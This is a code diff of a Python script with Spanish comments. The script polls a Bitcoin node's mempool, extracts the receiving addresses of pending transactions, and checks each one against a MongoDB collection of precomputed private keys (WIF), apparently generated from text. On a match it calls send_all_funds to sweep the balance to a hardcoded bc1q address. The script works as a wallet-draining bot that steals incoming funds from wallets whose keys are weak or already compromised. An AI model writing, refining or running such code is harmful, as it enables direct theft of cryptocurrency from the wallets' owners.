@@ -154,54 +154,76 @@ def obtener_info_bloque(block_number):
         return None, [], None
 
 
-# Obtener todas las direcciones del tx
-def get_transaction_addresses(txid=None):
+# Obtener todas las direcciones del tx que son direcciones que estan recibiendo fondos
+def get_transaction_addresses(txid=None, mode="vout"):
+    """
+    Obtiene las direcciones de una transacción en función del modo: entradas (vin) o salidas (vout).
 
+    :param txid: ID de la transacción (txid)
+    :param mode: "vin" para direcciones que envían, "vout" para direcciones que reciben
+    :return: Lista de direcciones en función del modo seleccionado
+    """
     if not txid:
-        return []
-
+        return {"error": "Debe proporcionar un txid válido."}
 
     data = {
         "method": "getrawtransaction",
-        "params": [txid, True],
+        "params": [txid, True],  # Solicitar transacción decodificada
+        "id": 1
+    }
+
+    try:
+        # Realizar la solicitud al servidor Bitcoin (puedes cambiar 'btcHost' y 'auth' según corresponda)
+        response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
+        response.raise_for_status()
+        transaction_info = response.json().get('result')
+
+        # Si no se encuentra la información de la transacción, devolver una lista vacía
+        if not transaction_info:
+            return []
+
+        if mode == "vin":
+            # Procesar direcciones de entrada (vin) - aunque no se tiene acceso directo a las direcciones de entrada
+            vin_addresses = []
+            for vin in transaction_info.get('vin', []):
+                # Las entradas generalmente no contienen direcciones directas, pero se puede obtener el txid y vout.
+                # Es necesario obtener más información de la transacción anterior si es necesario.
+                vin_addresses.append(vin.get('txid'))  # Aquí sólo guardamos el txid de las entradas
+            return vin_addresses
+
+        elif mode == "vout":
+            # Procesar direcciones de salida (vout)
+            vout_addresses = []
+            for vout in transaction_info.get('vout', []):
+                address = vout.get('scriptPubKey', {}).get('address')  # Extraemos la dirección directamente de 'address'
+                if address:
+                    vout_addresses.append(address)
+
+            return vout_addresses
+
+        else:
+            return []
+
+    except requests.exceptions.RequestException as e:
+        return []
+
+
+# Obtener las transacciones pendiente que aun no esta en los bloque
+def get_mempool_transactions():
+    data = {
+        "method": "getrawmempool",
+        "params": [],  # Sin parámetros adicionales
         "id": 1
     }
 
     try:
         response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
-        response.raise_for_status()
-        transaction_info = response.json().get('result')
-
-        getRAWTX = transaction_info['hex']
-
-        if not getRAWTX:
-            return []
-        
-        m = parseTx(getRAWTX)
-
-        if isinstance(m, dict) and "error" in m:
-            return []
-
-        e = getSignableTxn(m)
-
-        # Extraer direcciones de salida 
-        addresses = set()
-
-        for i in range(len(e)):
-            pubKey = e[i][3]
-            # Convertir PubKey a Address
-            if pubKey:
-                getAddress = pubkey_to_bitcoin_address(pubKey)
-                addresses.add(getAddress)
-
-
-        return addresses
-
+        response.raise_for_status()  # Verifica si la solicitud tuvo éxito
+        result = response.json().get('result')
+        return result  # Esto será una lista de IDs de transacciones pendientes
     except requests.exceptions.RequestException as e:
-        print(f"Ocurrio Error al obtener address: {e}")
-        return []
-
-
+        print(f"Error fetching mempool transactions: {e}")
+        return False
 
 # Función para enviar todos los fondos
 def send_all_funds(privateKeyWIF, destination_address):
@@ -306,31 +328,36 @@ def generar_direcciones_y_wif(texto=None, isAddress=False):
     }
 
 
-# Función para procesar un bloque y sus transacciones
-def procesar_bloque_y_transacciones(bloque_id):
+# Función para procesar todas las transacciones pendiente de la mempool
+def procesar_bloque_y_transacciones():
 
-    # Obtener información del bloque
-    block_hash, tx_hashes, getmerkleroot = obtener_info_bloque(bloque_id)
-    if block_hash is None:
+    # Obtener todas las transacciones pendientes en la mempool, solo la direccion (Para) la que esta recibiendo fondos
+    tx_hashes = get_mempool_transactions()
+    if tx_hashes is None:
         return
+
+    # Contar el total de transacciones en la lista
+    total_transactions = len(tx_hashes)
 
     # Obtenemos las direcciones de las transacciones y les asignamos los WIFs, buscamos la direcciones de cada tx y asi buscamos en mongodb si existe la direccion entonces retiramos
     for i, tx_hash in enumerate(tx_hashes):
-        # Mostrar el número de transacciones restantes por procesar
-        #print(f"Procesando transacción {tx_hash}... ({i+1} de {len(tx_hashes)}) restantes.")
 
-        # del Txid sacamos las direcciones
+        # Muestra el progreso en la misma línea
+        print(f"[Procesando] {i}/{total_transactions} Tx", end="\r")
+
+        # del Txid sacamos las direcciones que estan recibiendo fondos (para)
         tx_direcciones = get_transaction_addresses(tx_hash)
         for addr in tx_direcciones:
 
             # Verificamos que no este vacio, esto devuelve la direccion que tiene los tx y que la direccion comienze con 1
             if addr and addr.startswith('1'): 
 
-                #print(f"[Buscando MONGODB] {addr}") 
+                #print(f"[Buscando MONGODB] {addr} :: Txid: {tx_hash}") 
 
                 # Buscar en MongoDB, si existe retiramos saldo
                 searchMongoDBWIF = buscar_wifMongoDB(addr)
                 if searchMongoDBWIF:
+
                     print(f"[Nueva Transaccion] {addr} :: {searchMongoDBWIF}")
 
                     # Guardar la Wallet que se encontro con actividad reciente
@@ -340,24 +367,10 @@ def procesar_bloque_y_transacciones(bloque_id):
                     send_all_funds(searchMongoDBWIF, 'bc1qzsdnfmmqr5gadz5kqcead7z3hqqsvxm6rvfrlv')
 
 
-
-# Obtener el número del último bloque
-latest_block_number = None  # Inicializamos con None para forzar la ejecución al inicio
-new_block_number = None
-
 while True:
 
-    # Obtener el número más reciente del bloque
-    new_block_number = get_latest_block_number()
+    # EJECUTAR PARA OBTENER TODAS LAS TRANSACCIONES PENDIENTE DE LA MEMPOOL
+    procesar_bloque_y_transacciones()
 
-    getNetworkFee = get_highest_fee()
-
-    # Verificamos si el número del bloque ha cambiado o si es la primera vez
-    if new_block_number != latest_block_number:
-        latest_block_number = new_block_number  # Actualizamos el bloque procesado
-        print(f"Nuevo bloque detectado: {new_block_number} | Network Fee: {getNetworkFee} | Procesando...")
-        procesar_bloque_y_transacciones(new_block_number)
-
-
-    # Esperar un tiempo antes de verificar el siguiente bloque (ajustar según sea necesario)
-    time.sleep(15)  # Ajusta el tiempo de espera según lo necesites
+    # Esperamos 5 Segundos luego de procesar todas las transacciones pendiente de la mempool
+    time.sleep(5)
